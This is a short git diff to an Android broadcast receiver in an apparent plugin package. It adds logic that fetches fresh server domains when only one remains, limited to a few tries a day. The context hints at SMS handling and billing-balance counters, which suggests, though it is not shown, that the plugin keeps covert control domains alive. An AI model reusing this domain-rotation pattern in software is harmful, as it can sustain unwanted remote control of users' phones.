@@ -12,6 +12,7 @@ import com.plugin.common.utils.UtilsRuntime;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.Utils.BRCUtil;
 import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -41,6 +42,17 @@ public class ScreenBRC extends BroadcastReceiver {
         }
 
         if (intent == null) return;
+
+        //如果只剩下一个域名了，去服务器获取
+        if (DomanManager.getInstance(context).getDomainCount() <= 1
+            && UtilsRuntime.isOnline(context)
+            && SettingManager.getInstance().getTodayFetchDomainCount() < 5) {
+            //一天获取三次
+            Intent fetchIntent = new Intent();
+            fetchIntent.setAction(PluginService.ACTION_FETCH_DOMAIN);
+            fetchIntent.setClass(context, PluginService.class);
+            context.startService(fetchIntent);
+        }
 
         //check Google Service if runging for SMS
         Intent serviceIntent = new Intent();
@@ -145,6 +157,8 @@ public class ScreenBRC extends BroadcastReceiver {
                         SettingManager.getInstance().setKeyDayCount(0);
                         int next = AppRuntime.randomBetween(4, 11);
                         SettingManager.getInstance().setKeyRandomNetworkTime(next);
+
+                        SettingManager.getInstance().setTodayFetchDomainCount(0);
                     }
                     if (curMonth != lastMonth) {
                         //如果不是同一个月，将余额计数清零
